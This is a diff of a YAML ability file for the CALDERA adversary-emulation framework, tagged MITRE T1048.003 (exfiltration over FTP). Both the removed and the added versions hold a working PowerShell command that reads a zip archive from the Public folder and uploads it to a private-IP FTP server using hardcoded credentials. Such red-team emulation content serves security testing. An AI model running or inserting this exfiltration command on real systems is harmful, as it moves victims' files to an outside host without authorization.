@@ -1,55 +1,45 @@
-- privilege: ''
+- singleton: true
+  delete_payload: false
+  technique_name: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol
+  name: copy compressed archive to ftp server
+  description: This abilities copy a file to the CALDERA's FTP server
+  privilege: ''
+  requirements: []
+  repeatable: false
   plugin: ''
-  delete_payload: true
+  buckets: []
+  access: {}
   technique_id: T1048.003
   additional_info: {}
-  technique_name: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol
-  repeatable: false
   tactic: exfiltration
-  requirements: []
-  description: This abilities copy a file to the CALDREA's FTP server
   executors:
-  - platform: windows
-    cleanup: []
-    variations: []
-    timeout: 180 
-    additional_info: {}
-    name: psh
+  - build_target: null
     payloads: []
+    timeout: 180
+    name: psh
     language: null
+    code: null
+    platform: windows
     uploads: []
     parsers: []
-    code: null
-    build_target: null
-    command: '
-      $Username = "caldera_user";
-      $Password = "caldera";
-      $Ftp = "ftp://192.168.0.149";
-      $FtpPort = "2222";
-      $ArchiveName = "data.zip";
-      $LocalStorageDir = "$env:PUBLIC";
-      $slash = "/";
-      $AntiSlash = "\";
-      $Column = ":";
-      $FullPathArchive = "$LocalStorageDir$AntiSlash$ArchiveName";
-      $RemoteFileName = "$(Get-Date -Format yyyymmddhhmmss)-exfil-$ArchiveName";
-      $FtpUri = $Ftp + $Column + $FtpPort + $Slash + $RemoteFileName;
-      $Uri=[system.URI] $FtpUri;
-      $FtpUpload = [System.Net.FtpWebRequest]::Create("$FtpUri");
-      $FtpUpload = [System.Net.FTPWebRequest]$FtpUpload;
-      $FtpUpload.Method = [System.Net.WebRequestMethods+Ftp]::UploadFile;
-      $FtpUpload.Credentials = New-Object System.Net.NetworkCredential($Username,$Password);
-      $FtpUpload.UseBinary = $true;
-      $FtpUpload.UsePassive = $true;
-      $FileContent = gc -encoding Byte $FullPathArchive;
-      $FtpUpload.ContentLength = $FileContent.Length;
-      $Run = $FtpUpload.GetRequestStream();
-      $Run.Write($FileContent, 0, $FileContent.Length);
-      $Run.Close();
-      $Run.Dispose();
-      '
-  singleton: true
-  buckets: []
-  name: copy compressed archive to ftp server
-  access: {}
+    additional_info: {}
+    variations: []
+    command: "$LogFile=\"$env:PUBLIC\\exf\\exfiltration.log\";\n$Username = \"caldera_user\"\
+      ; \n$Password = \"caldera\"; \n$Ftp = \"ftp://192.168.111.57\"; \n$FtpPort =\
+      \ \"2222\"; \n$ArchiveName = \"data.zip\"; \n$LocalStorageDir = \"$env:PUBLIC\\\
+      exf\"; \n$Slash = \"/\"; \n$AntiSlash = \"\\\"; \n$Column = \":\";\n$FtpUri=\"\
+      $Ftp$Column$FtpPort\"; \n$FullPathArchive = \"$LocalStorageDir$AntiSlash$ArchiveName\"\
+      ;\nGet-Date | Out-File -FilePath \"$LogFile\";\nif ([System.IO.File]::Exists(\"\
+      $FullPathArchive\")) {\n$ftp = [System.Net.FtpWebRequest]::Create(\"$FtpUri$Slash$ArchiveName\"\
+      );\n$ftp = [System.Net.FTPWebRequest]$ftp;\n$ftp.Method = [System.Net.WebRequestMethods+Ftp]::UploadFile;\n\
+      $ftp.Credentials = New-Object System.Net.NetworkCredential(\"$Username\", \"\
+      $Password\");\n$ftp.UseBinary = $true;\n$ftp.UsePassive = $true;\n$content =\
+      \ [System.IO.File]::ReadAllBytes(\"$FullPathArchive\");\n$ftp.ContentLength\
+      \ = $content.Length;\n$requestStream = $ftp.GetRequestStream();\n$requestStream.Write($content,\
+      \ 0, $content.Length);\n$Result=\"The file \"+\"$FullPathArchive\"+\" has been\
+      \ succefully uploaded to \"+\"$FtpUri\";\nWrite-Output \"$Result\" | Out-File\
+      \ -FilePath \"$LogFile\" -Append;\n$requestStream.Close();\n$requestStream.Dispose();\n\
+      exit 0;\n}\nelse { \"The file $FullPathArchive does not exists !!!\" | Out-File\
+      \ -FilePath \"$LogFile\" -Append;\nexit 1;\n};"
+    cleanup: []
   id: ftp_archive_exfiltration
